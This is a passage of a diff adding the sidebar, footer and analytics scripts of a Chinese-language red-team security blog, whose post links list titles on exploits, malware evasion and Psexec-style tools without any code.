+      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
+    
+    <li><a class="post-link" href="/posts/">更多....</a></li>
+  </ul>
+</div>
+
+<div class="col-box post-toc hide">
+  <div class="col-box-title">TOC</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    <footer class="footer">
+<div class="wrapper">
+© 2021 倾旋
+</div>
+</footer>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-158746438-1');
+</script>
+
+<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
+<script src="/js/easybook.js"></script>
+
+
+  </body>
+
+</html>
